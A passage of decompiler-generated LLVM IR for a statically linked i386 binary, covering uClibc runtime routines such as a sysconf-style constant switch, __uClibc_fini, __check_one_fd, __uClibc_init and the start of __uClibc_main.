    i32 53, label %dec_label_pc_8050d6c
    i32 54, label %dec_label_pc_8050d6c
    i32 55, label %dec_label_pc_8050d6c
    i32 56, label %dec_label_pc_8050d6c
    i32 57, label %dec_label_pc_8050d6c
    i32 58, label %dec_label_pc_8050d6c
    i32 59, label %dec_label_pc_8050d6c
    i32 60, label %dec_label_pc_8050d6c
    i32 61, label %dec_label_pc_8050d6c
    i32 62, label %dec_label_pc_8050d6c
    i32 63, label %dec_label_pc_8050d6c
    i32 64, label %dec_label_pc_8050d6c
    i32 65, label %dec_label_pc_8050d6c
    i32 66, label %dec_label_pc_8050d6c
    i32 67, label %dec_label_pc_8050c6d
    i32 68, label %dec_label_pc_8050c6d
    i32 69, label %dec_label_pc_8050d50
    i32 70, label %dec_label_pc_8050d50
    i32 71, label %dec_label_pc_8050d50
    i32 72, label %dec_label_pc_8050d57
    i32 73, label %dec_label_pc_8050d5e
    i32 74, label %dec_label_pc_8050d65
    i32 75, label %dec_label_pc_8050cd3
    i32 76, label %dec_label_pc_8050d65
    i32 77, label %dec_label_pc_8050c6d
    i32 78, label %dec_label_pc_8050c6d
    i32 79, label %dec_label_pc_8050c6d
    i32 80, label %dec_label_pc_8050c6d
    i32 81, label %dec_label_pc_8050c6d
    i32 82, label %dec_label_pc_8050c6d
    i32 83, label %dec_label_pc_8050c6d
    i32 84, label %dec_label_pc_8050c6d
    i32 85, label %dec_label_pc_8050d6c
    i32 86, label %dec_label_pc_8050d6c
    i32 87, label %dec_label_pc_8050d49
    i32 88, label %dec_label_pc_8050cdd
    i32 89, label %dec_label_pc_8050ce7
    i32 90, label %dec_label_pc_8050d5e
    i32 91, label %dec_label_pc_8050c6d
    i32 92, label %dec_label_pc_8050c6d
    i32 93, label %dec_label_pc_8050c6d
    i32 94, label %dec_label_pc_8050c6d
    i32 95, label %dec_label_pc_8050d42
    i32 96, label %dec_label_pc_8050d6c
    i32 97, label %dec_label_pc_8050d6c
    i32 98, label %dec_label_pc_8050c6d
    i32 99, label %dec_label_pc_8050c6d
    i32 100, label %dec_label_pc_8050c6d
    i32 101, label %dec_label_pc_8050cf1
    i32 102, label %dec_label_pc_8050d34
    i32 103, label %dec_label_pc_8050d71
    i32 104, label %dec_label_pc_8050d49
    i32 105, label %dec_label_pc_8050cfb
    i32 106, label %dec_label_pc_8050d57
    i32 107, label %dec_label_pc_8050d57
    i32 108, label %dec_label_pc_8050d3b
    i32 109, label %dec_label_pc_8050d78
    i32 110, label %dec_label_pc_8050d94
    i32 111, label %dec_label_pc_8050d34
    i32 112, label %dec_label_pc_8050d71
    i32 113, label %dec_label_pc_8050d94
    i32 114, label %dec_label_pc_8050d05
    i32 115, label %dec_label_pc_8050d8d
    i32 116, label %dec_label_pc_8050d6c
    i32 117, label %dec_label_pc_8050d6c
    i32 118, label %dec_label_pc_8050d0f
    i32 119, label %dec_label_pc_8050d19
    i32 120, label %dec_label_pc_8050d86
    i32 121, label %dec_label_pc_8050d49
    i32 122, label %dec_label_pc_8050d49
    i32 123, label %dec_label_pc_8050d49
    i32 124, label %dec_label_pc_8050d49
    i32 125, label %dec_label_pc_8050c6d
    i32 126, label %dec_label_pc_8050c6d
    i32 127, label %dec_label_pc_8050d6c
    i32 128, label %dec_label_pc_8050d6c
    i32 129, label %dec_label_pc_8050c6d
    i32 130, label %dec_label_pc_8050c6d
    i32 131, label %dec_label_pc_8050d6c
    i32 149, label %dec_label_pc_8050d20
  ]

dec_label_pc_8050c6d:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8050d99

dec_label_pc_8050c77:                             ; preds = %entry
  %v1_8050c77 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_8050c7c = inttoptr i32 %v1_8050c77 to i32*
  store i32 22, i32* %v1_8050c7c, align 4
  br label %dec_label_pc_8050d6c

dec_label_pc_8050c87:                             ; preds = %entry
  br label %dec_label_pc_8050d99

dec_label_pc_8050c91:                             ; preds = %entry
  br label %dec_label_pc_8050d99

dec_label_pc_8050c9b:                             ; preds = %entry
  br label %dec_label_pc_8050d99

dec_label_pc_8050ca5:                             ; preds = %entry
  %v1_8050ca8 = call i32 @getdtablesize(i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_8050cad

dec_label_pc_8050cad:                             ; preds = %entry, %dec_label_pc_8050ca5
  br label %dec_label_pc_8050d99

dec_label_pc_8050cb7:                             ; preds = %entry
  %v0_8050cba = call i32 @__GI_getpagesize()
  br label %dec_label_pc_8050cbf

dec_label_pc_8050cbf:                             ; preds = %entry, %dec_label_pc_8050cb7
  br label %dec_label_pc_8050d99

dec_label_pc_8050cc9:                             ; preds = %entry
  br label %dec_label_pc_8050d99

dec_label_pc_8050cd3:                             ; preds = %entry
  br label %dec_label_pc_8050d99

dec_label_pc_8050cdd:                             ; preds = %entry
  br label %dec_label_pc_8050d99

dec_label_pc_8050ce7:                             ; preds = %entry
  br label %dec_label_pc_8050d99

dec_label_pc_8050cf1:                             ; preds = %entry
  br label %dec_label_pc_8050d99

dec_label_pc_8050cfb:                             ; preds = %entry
  br label %dec_label_pc_8050d99

dec_label_pc_8050d05:                             ; preds = %entry
  br label %dec_label_pc_8050d99

dec_label_pc_8050d0f:                             ; preds = %entry
  br label %dec_label_pc_8050d99

dec_label_pc_8050d19:                             ; preds = %entry
  br label %dec_label_pc_8050d99

dec_label_pc_8050d20:                             ; preds = %entry
  %v5_8050d26 = call i32 @__GI_clock_getres(i32 1, %timespec* null, i32 149, i32 149)
  %v2_8050d2e = icmp slt i32 %v5_8050d26, 0
  %v1_8050d30 = icmp eq i1 %v2_8050d2e, false
  br i1 %v1_8050d30, label %dec_label_pc_8050d42, label %dec_label_pc_8050d6c

dec_label_pc_8050d34:                             ; preds = %entry, %entry
  br label %dec_label_pc_8050d99

dec_label_pc_8050d3b:                             ; preds = %entry, %entry
  br label %dec_label_pc_8050d99

dec_label_pc_8050d42:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_8050d20
  br label %dec_label_pc_8050d99

dec_label_pc_8050d49:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8050d99

dec_label_pc_8050d50:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_8050d99

dec_label_pc_8050d57:                             ; preds = %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8050d99

dec_label_pc_8050d5e:                             ; preds = %entry, %entry
  br label %dec_label_pc_8050d99

dec_label_pc_8050d65:                             ; preds = %entry, %entry
  br label %dec_label_pc_8050d99

dec_label_pc_8050d6c:                             ; preds = %dec_label_pc_8050d20, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_8050c77
  br label %dec_label_pc_8050d99

dec_label_pc_8050d71:                             ; preds = %entry, %entry
  br label %dec_label_pc_8050d99

dec_label_pc_8050d78:                             ; preds = %entry, %entry
  br label %dec_label_pc_8050d99

dec_label_pc_8050d7f:                             ; preds = %entry, %entry
  br label %dec_label_pc_8050d99

dec_label_pc_8050d86:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_8050d99

dec_label_pc_8050d8d:                             ; preds = %entry, %entry
  br label %dec_label_pc_8050d99

dec_label_pc_8050d94:                             ; preds = %entry, %entry, %entry
  br label %dec_label_pc_8050d99

dec_label_pc_8050d99:                             ; preds = %dec_label_pc_8050d8d, %dec_label_pc_8050d86, %dec_label_pc_8050d7f, %dec_label_pc_8050d78, %dec_label_pc_8050d71, %dec_label_pc_8050d65, %dec_label_pc_8050d5e, %dec_label_pc_8050d57, %dec_label_pc_8050d50, %dec_label_pc_8050d49, %dec_label_pc_8050d3b, %dec_label_pc_8050d34, %dec_label_pc_8050d42, %dec_label_pc_8050d19, %dec_label_pc_8050d0f, %dec_label_pc_8050d05, %dec_label_pc_8050cfb, %dec_label_pc_8050cf1, %dec_label_pc_8050ce7, %dec_label_pc_8050cdd, %dec_label_pc_8050cd3, %dec_label_pc_8050cc9, %dec_label_pc_8050cbf, %dec_label_pc_8050cad, %dec_label_pc_8050c9b, %dec_label_pc_8050c91, %dec_label_pc_8050c87, %dec_label_pc_8050c6d, %dec_label_pc_8050d6c, %dec_label_pc_8050d94
  %v0_8050d9c = phi i32 [ 255, %dec_label_pc_8050d8d ], [ 2048, %dec_label_pc_8050d86 ], [ 99, %dec_label_pc_8050d7f ], [ 20, %dec_label_pc_8050d78 ], [ -128, %dec_label_pc_8050d71 ], [ 1024, %dec_label_pc_8050d65 ], [ 4, %dec_label_pc_8050d5e ], [ 32, %dec_label_pc_8050d57 ], [ 256, %dec_label_pc_8050d50 ], [ 2147483647, %dec_label_pc_8050d49 ], [ 16, %dec_label_pc_8050d3b ], [ 127, %dec_label_pc_8050d34 ], [ 200112, %dec_label_pc_8050d42 ], [ 9, %dec_label_pc_8050d19 ], [ 65535, %dec_label_pc_8050d0f ], [ -32768, %dec_label_pc_8050d05 ], [ -2147483648, %dec_label_pc_8050cfb ], [ 8, %dec_label_pc_8050cf1 ], [ 500, %dec_label_pc_8050ce7 ], [ 4096, %dec_label_pc_8050cdd ], [ 16384, %dec_label_pc_8050cd3 ], [ 1000, %dec_label_pc_8050cc9 ], [ 32768, %dec_label_pc_8050cbf ], [ 6, %dec_label_pc_8050cad ], [ 65536, %dec_label_pc_8050c9b ], [ 100, %dec_label_pc_8050c91 ], [ 131072, %dec_label_pc_8050c87 ], [ 1, %dec_label_pc_8050c6d ], [ -1, %dec_label_pc_8050d6c ], [ 32767, %dec_label_pc_8050d94 ]
  ret i32 %v0_8050d9c

; uselistorder directives
  uselistorder i32 16384, { 0, 13, 5, 6, 7, 8, 9, 10, 11, 12, 1, 2, 3, 4 }
  uselistorder i32 -2147483648, { 4, 6, 0, 5, 7, 1, 2, 3 }
  uselistorder i32 65535, { 1, 0 }
  uselistorder i32 (i32)* @getdtablesize, { 4, 3, 1, 2, 0 }
  uselistorder i32 149, { 1, 0, 2 }
  uselistorder i32 129, { 1, 0 }
  uselistorder i32 124, { 1, 0 }
  uselistorder i32 115, { 4, 0, 1, 2, 3 }
  uselistorder i32 100, { 1, 2, 0 }
  uselistorder i32 95, { 3, 1, 0, 2 }
  uselistorder i32 80, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 70, { 1, 2, 0 }
  uselistorder i32 60, { 2, 0, 1 }
  uselistorder i32 58, { 4, 0, 1, 2, 3 }
  uselistorder i32 53, { 1, 0 }
  uselistorder i32 50, { 1, 0 }
  uselistorder i32 46, { 2, 0, 1 }
  uselistorder i32 38, { 1, 2, 0 }
  uselistorder i32 36, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 34, { 4, 5, 7, 8, 3, 0, 1, 6, 2 }
  uselistorder i32 33, { 2, 3, 0, 1 }
  uselistorder i32 30, { 7, 1, 0, 2, 3, 8, 9, 10, 4, 5, 6 }
  uselistorder i32 26, { 2, 1, 0 }
  uselistorder i32 23, { 1, 2, 0 }
  uselistorder i32 19, { 2, 1, 0 }
  uselistorder i32 17, { 10, 8, 9, 3, 4, 2, 12, 7, 1, 0, 11, 5, 6 }
  uselistorder i32 15, { 1, 9, 8, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 13, { 3, 0, 1, 2 }
  uselistorder i32 11, { 6, 9, 4, 2, 7, 8, 0, 5, 3, 1 }
  uselistorder i32 7, { 4, 2, 1, 5, 6, 7, 8, 9, 3, 0, 10 }
  uselistorder i32 5, { 14, 8, 9, 15, 10, 20, 21, 0, 4, 16, 5, 17, 6, 18, 7, 19, 11, 12, 13, 1, 2, 3 }
  uselistorder label %dec_label_pc_8050d99, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_8050d6c, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_8050d42, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8050cbf, { 1, 0 }
  uselistorder label %dec_label_pc_8050cad, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050da0 = load i32, i32* @ebx, align 4
  store i32 %v0_8050da0, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055100.151 to i32), i32 -134566144), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055100.151 to i32), i32 -134566144), i32 2), i32 0), label %dec_label_pc_8050db4, label %dec_label_pc_8050dc1

dec_label_pc_8050db4:                             ; preds = %entry, %dec_label_pc_8050db4
  %v1_8050dbb6 = phi i32 [ %v1_8050dbb, %dec_label_pc_8050db4 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055100.151 to i32), i32 -134566144), i32 2), i32 -1), %entry ]
  store i32 ptrtoint (i32* @global_var_8050dbb.152 to i32), i32* %stack_var_-16, align 4
  %v5_8050db4 = mul i32 %v1_8050dbb6, 4
  %v6_8050db4 = add i32 %v5_8050db4, ptrtoint (i32* @global_var_8055100.151 to i32)
  %v7_8050db4 = inttoptr i32 %v6_8050db4 to i32*
  %v8_8050db4 = load i32, i32* %v7_8050db4, align 4
  call void @__pseudo_call(i32 %v8_8050db4)
  %v0_8050dbb.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050dbb = add i32 %v0_8050dbb.pre, -1
  store i32 %v1_8050dbb, i32* %ebx.global-to-local, align 4
  %v10_8050dbc = icmp eq i32 %v0_8050dbb.pre, 0
  %v1_8050dbf = icmp eq i1 %v10_8050dbc, false
  br i1 %v1_8050dbf, label %dec_label_pc_8050db4, label %dec_label_pc_8050dc1

dec_label_pc_8050dc1:                             ; preds = %dec_label_pc_8050db4, %entry
  %v0_8050dc1 = load i32, i32* @global_var_805b488.153, align 8
  %v1_8050dc6 = icmp eq i32 %v0_8050dc1, 0
  br i1 %v1_8050dc6, label %dec_label_pc_8050dcc, label %dec_label_pc_8050dca

dec_label_pc_8050dca:                             ; preds = %dec_label_pc_8050dc1
  %v0_8050dca = load i32, i32* %stack_var_-16, align 4
  %v1_8050dca = call i32 @unknown_0(i32 %v0_8050dca)
  br label %dec_label_pc_8050dcc

dec_label_pc_8050dcc:                             ; preds = %dec_label_pc_8050dca, %dec_label_pc_8050dc1
  %v0_8050dcc = load i32, i32* @global_var_805b48c.154, align 4
  %v1_8050dd2 = icmp eq i32 %v0_8050dcc, 0
  br i1 %v1_8050dd2, label %dec_label_pc_8050ddb, label %dec_label_pc_8050dd6

dec_label_pc_8050dd6:                             ; preds = %dec_label_pc_8050dcc
  %v2_8050dd8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050dd8, i32* %ebx.global-to-local, align 4
  %v0_8050dd9 = load i32, i32* %stack_var_-16, align 4
  %v1_8050dd9 = call i32 @unknown_0(i32 %v0_8050dd9)
  br label %dec_label_pc_8050ddb

dec_label_pc_8050ddb:                             ; preds = %dec_label_pc_8050dcc, %dec_label_pc_8050dd6
  %v2_8050ddb = load i32, i32* %stack_var_-16, align 4
  %v2_8050ddc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8050ddc, i32* @edx, align 4
  ret i32 %v2_8050ddb

; uselistorder directives
  uselistorder i32 %v1_8050dbb, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 2, 1, 0, 3 }
  uselistorder i32* %ebx.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8050ddb, { 1, 0 }
  uselistorder label %dec_label_pc_8050db4, { 1, 0 }
}

define i32 @__pthread_return_0(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8050de2 = load i32, i32* @eax, align 4
  ret i32 %v0_8050de2
}

define i32 @__check_one_fd() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8050de3 = load i32, i32* @esi, align 4
  %v0_8050de4 = load i32, i32* @ebx, align 4
  store i32 %v0_8050de4, i32* %stack_var_-8, align 4
  %v0_8050de8 = load i32, i32* @eax, align 4
  store i32 %v0_8050de8, i32* @esi, align 4
  %v0_8050dea = load i32, i32* @edx, align 4
  store i32 %v0_8050dea, i32* @ebx, align 4
  %v4_8050def = call i32 @__libc_fcntl(i32 %v0_8050de8, i32 1, i32 %tmp6)
  %v8_8050df7 = icmp eq i32 %v4_8050def, -1
  %v1_8050df8 = icmp eq i1 %v8_8050df7, false
  br i1 %v1_8050df8, label %dec_label_pc_8050e13, label %dec_label_pc_8050dfa

dec_label_pc_8050dfa:                             ; preds = %entry
  %v0_8050dfc = load i32, i32* @ebx, align 4
  %v5_8050e02 = call i32 @__libc_open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8054020.155, i32 0, i32 0), i32 %v0_8050dfc)
  %v1_8050e0a = load i32, i32* @esi, align 4
  %v12_8050e0a = icmp eq i32 %v5_8050e02, %v1_8050e0a
  br i1 %v12_8050e0a, label %dec_label_pc_8050e13, label %dec_label_pc_8050e0e

dec_label_pc_8050e0e:                             ; preds = %dec_label_pc_8050dfa
  %v0_8050e0e = call i32 @abort()
  br label %dec_label_pc_8050e13

dec_label_pc_8050e13:                             ; preds = %dec_label_pc_8050dfa, %entry, %dec_label_pc_8050e0e
  %v2_8050e13 = load i32, i32* %stack_var_-12, align 4
  %v2_8050e14 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8050e14, i32* @ebx, align 4
  store i32 %v0_8050de3, i32* @esi, align 4
  ret i32 %v2_8050e13

; uselistorder directives
  uselistorder i32 ()* @abort, { 0, 3, 2, 1 }
  uselistorder i32 (i8*, i32)* @__libc_open, { 4, 0, 1, 2, 3 }
  uselistorder i32 (i32, i32, i32)* @__libc_fcntl, { 0, 8, 7, 6, 5, 12, 11, 10, 9, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_8050e13, { 2, 0, 1 }
}

define i32 @__GI___uClibc_init() local_unnamed_addr {
entry:
  %v0_8050e1a = load i8, i8* @global_var_805b490.156, align 16
  %v1_8050e1a = icmp eq i8 %v0_8050e1a, 0
  %v1_8050e21 = icmp eq i1 %v1_8050e1a, false
  br i1 %v1_8050e21, label %entry.dec_label_pc_8050e53_crit_edge, label %dec_label_pc_8050e23

entry.dec_label_pc_8050e53_crit_edge:             ; preds = %entry
  %v0_8050e56.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8050e53

dec_label_pc_8050e23:                             ; preds = %entry
  store i8 1, i8* @global_var_805b490.156, align 16
  store i32 4096, i32* @global_var_805b484.157, align 4
  %v0_8050e4e = call i32 @_stdio_init()
  br label %dec_label_pc_8050e53

dec_label_pc_8050e53:                             ; preds = %entry.dec_label_pc_8050e53_crit_edge, %dec_label_pc_8050e23
  %v0_8050e56 = phi i32 [ %v0_8050e56.pre, %entry.dec_label_pc_8050e53_crit_edge ], [ %v0_8050e4e, %dec_label_pc_8050e23 ]
  ret i32 %v0_8050e56

; uselistorder directives
  uselistorder i8 1, { 29, 0, 28, 24, 25, 1, 26, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 3, 27, 23 }
  uselistorder i8* @global_var_805b490.156, { 1, 0 }
  uselistorder label %dec_label_pc_8050e53, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp31 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %v0_8050e58 = load i32, i32* @edi, align 4
  store i32 %tmp31, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_805b47c.158, align 4
  store i32 %arg6, i32* @global_var_805b48c.154, align 4
  %v2_8050e8e = mul i32 %arg2, 4
  %v3_8050e8e = add i32 %tmp31, %v2_8050e8e
  %v1_8050e91 = add i32 %v3_8050e8e, 4
  store i32 %v1_8050e91, i32* @global_var_805b480.149, align 128
  %v3_8050e99 = load i32, i32* %arg3, align 4
  %v14_8050e99 = icmp eq i32 %v1_8050e91, %v3_8050e99
  %v1_8050e9b = icmp eq i1 %v14_8050e99, false
  br i1 %v1_8050e9b, label %dec_label_pc_8050ea3, label %dec_label_pc_8050e9d

dec_label_pc_8050e9d:                             ; preds = %entry
  store i32 %v3_8050e8e, i32* @global_var_805b480.149, align 128
  br label %dec_label_pc_8050ea3

dec_label_pc_8050ea3:                             ; preds = %entry, %dec_label_pc_8050e9d
  store i32 0, i32* %stack_var_-168, align 4
  %v2_8050ea8 = ptrtoint i32* %stack_var_-136 to i32
  %v3_8050ead = bitcast i32* %stack_var_-136 to i8*
  %v4_8050ead = call i32 @__GI_memset(i8* %v3_8050ead, i32 0, i32 120)
  %v0_8050eb2 = load i32, i32* @global_var_805b480.149, align 128
  br label %dec_label_pc_8050eba

dec_label_pc_8050eba:                             ; preds = %dec_label_pc_8050eba, %dec_label_pc_8050ea3
  %v0_8050eba = phi i32 [ %v1_8050ebd, %dec_label_pc_8050eba ], [ %v0_8050eb2, %dec_label_pc_8050ea3 ]
  %v1_8050eba = inttoptr i32 %v0_8050eba to i32*
  %v2_8050eba = load i32, i32* %v1_8050eba, align 4
  %v3_8050eba = icmp eq i32 %v2_8050eba, 0
  %v1_8050ebd = add i32 %v0_8050eba, 4
  %v1_8050ec0 = icmp eq i1 %v3_8050eba, false
  br i1 %v1_8050ec0, label %dec_label_pc_8050eba, label %dec_label_pc_8050ee1.preheader

dec_label_pc_8050ee1.preheader:                   ; preds = %dec_label_pc_8050eba
  store i32 %v1_8050ebd, i32* @ebx, align 4
  %v1_8050ee11 = inttoptr i32 %v1_8050ebd to i32*
  %v2_8050ee12 = load i32, i32* %v1_8050ee11, align 4
  %v3_8050ee13 = icmp eq i32 %v2_8050ee12, 0
  %v1_8050ee410 = icmp eq i1 %v3_8050ee13, false
  br i1 %v1_8050ee410, label %dec_label_pc_8050ec6.lr.ph, label %dec_label_pc_8050ee6

dec_label_pc_8050ec6.lr.ph:                       ; preds = %dec_label_pc_8050ee1.preheader
  %v3_8050ea6 = ptrtoint i32* %stack_var_-168 to i32
  %v3_8050ed1 = add i32 %v3_8050ea6, 32
  br label %dec_label_pc_8050ec6

dec_label_pc_8050ec6:                             ; preds = %dec_label_pc_8050ec6.lr.ph, %dec_label_pc_8050ede
  %v1_8050ed1 = phi i32 [ %v2_8050ee12, %dec_label_pc_8050ec6.lr.ph ], [ %v2_8050ee1, %dec_label_pc_8050ede ]
  %v0_8050ed0 = phi i32 [ %v1_8050ebd, %dec_label_pc_8050ec6.lr.ph ], [ %v1_8050ede, %dec_label_pc_8050ede ]
  %v6_8050ecb = icmp ugt i32 %v1_8050ed1, 14
  br i1 %v6_8050ecb, label %dec_label_pc_8050ede, label %dec_label_pc_8050ecd

dec_label_pc_8050ecd:                             ; preds = %dec_label_pc_8050ec6
  store i32 %v0_8050ed0, i32* %stack_var_-168, align 4
  %v2_8050ed1 = mul i32 %v1_8050ed1, 8
  %v4_8050ed1 = add i32 %v3_8050ed1, %v2_8050ed1
  %v3_8050ed6 = inttoptr i32 %v4_8050ed1 to i16*
  %v4_8050ed6 = call i32 @memcpy(i16* %v3_8050ed6, i32 %v0_8050ed0, i32 8)
  %v0_8050ede.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8050ede

dec_label_pc_8050ede:                             ; preds = %dec_label_pc_8050ec6, %dec_label_pc_8050ecd
  %v0_8050ede = phi i32 [ %v0_8050ed0, %dec_label_pc_8050ec6 ], [ %v0_8050ede.pre, %dec_label_pc_8050ecd ]
  %v1_8050ede = add i32 %v0_8050ede, 8
  store i32 %v1_8050ede, i32* @ebx, align 4
  %v1_8050ee1 = inttoptr i32 %v1_8050ede to i32*
  %v2_8050ee1 = load i32, i32* %v1_8050ee1, align 4
  %v3_8050ee1 = icmp eq i32 %v2_8050ee1, 0
  %v1_8050ee4 = icmp eq i1 %v3_8050ee1, false
  br i1 %v1_8050ee4, label %dec_label_pc_8050ec6, label %dec_label_pc_8050ee6

dec_label_pc_8050ee6:                             ; preds = %dec_label_pc_8050ede, %dec_label_pc_8050ee1.preheader
  store i32 %v2_8050ea8, i32* @eax, align 4
  %v0_8050eea = call i32 @_dl_aux_init()
  store i32 %v0_8050eea, i32* @eax, align 4
  %v0_8050eef = call i32 @__GI___uClibc_init()
  %v1_8050ef8 = icmp eq i32 %tmp26, 0
  %v1_8050efa = icmp eq i1 %v1_8050ef8, false
  br i1 %v1_8050efa, label %dec_label_pc_8050f00, label %dec_label_pc_8050efc

dec_label_pc_8050efc:                             ; preds = %dec_label_pc_8050ee6
  %v1_8050efc = and i32 %tmp26, -65536
  %v2_8050efc = or i32 %v1_8050efc, 4096
  br label %dec_label_pc_8050f00

dec_label_pc_8050f00:                             ; preds = %dec_label_pc_8050ee6, %dec_label_pc_8050efc
  %v0_8050f00 = phi i32 [ %tmp26, %dec_label_pc_8050ee6 ], [ %v2_8050efc, %dec_label_pc_8050efc ]
  store i32 %v0_8050f00, i32* @global_var_805b484.157, align 4
  %v13_8050f05 = icmp eq i32 %tmp25, -1
  %v1_8050f0a = icmp eq i1 %v13_8050f05, false
  br i1 %v1_8050f0a, label %dec_label_pc_8050f35, label %dec_label_pc_8050f0c

dec_label_pc_8050f0c:                             ; preds = %dec_label_pc_8050f00
  %v0_8050f0c = call i32 @getuid()
  store i32 %v0_8050f0c, i32* @ebx, align 4
  %v0_8050f13 = call i32 @geteuid()
  %v0_8050f18 = load i32, i32* @ebx, align 4
  %v12_8050f18 = icmp eq i32 %v0_8050f18, %v0_8050f13
  %v1_8050f1a = icmp eq i1 %v12_8050f18, false
  br i1 %v1_8050f1a, label %dec_label_pc_8050f4b, label %dec_label_pc_8050f1c

dec_label_pc_8050f1c:                             ; preds = %dec_label_pc_8050f0c
  %v0_8050f1c = call i32 @getgid()
  store i32 %v0_8050f1c, i32* @ebx, align 4
  %v0_8050f23 = call i32 @getegid()
  %v0_8050f28 = load i32, i32* @ebx, align 4
  %v12_8050f28 = icmp eq i32 %v0_8050f28, %v0_8050f23
  %v1_8050f2a = icmp eq i1 %v12_8050f28, false
  br i1 %v1_8050f2a, label %dec_label_pc_8050f4b, label %dec_label_pc_8050f2c.thread

dec_label_pc_8050f2c.thread:                      ; preds = %dec_label_pc_8050f1c
  br label %dec_label_pc_8050f75

dec_label_pc_8050f35:                             ; preds = %dec_label_pc_8050f00
  %v15_8050f35 = icmp eq i32 %tmp25, %tmp24
  %v1_8050f39 = icmp eq i1 %v15_8050f35, false
  br i1 %v1_8050f39, label %dec_label_pc_8050f4b, label %dec_label_pc_8050f3b

dec_label_pc_8050f3b:                             ; preds = %dec_label_pc_8050f35
  br label %dec_label_pc_8050f4b

dec_label_pc_8050f4b:                             ; preds = %dec_label_pc_8050f3b, %dec_label_pc_8050f35, %dec_label_pc_8050f1c, %dec_label_pc_8050f0c
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_8050f52 = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_8050f61 = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_8050f70 = call i32 @__check_one_fd()
  br label %dec_label_pc_8050f75

dec_label_pc_8050f75:                             ; preds = %dec_label_pc_8050f2c.thread, %dec_label_pc_8050f4b
  store i32 ptrtoint (i32* @global_var_8055100.151 to i32), i32* %esi.global-to-local, align 4
  %v0_8050f7a = load i32, i32* @edi, align 4
  %v1_8050f7a = inttoptr i32 %v0_8050f7a to i32*
  %v2_8050f7a = load i32, i32* %v1_8050f7a, align 4
  store i32 %v2_8050f7a, i32* bitcast (i32** @global_var_80553f8.160 to i32*), align 8
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055100.151 to i32), i32 -134566144), i32 2), i32* %esi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 %arg5, i32* @global_var_805b488.153, align 8
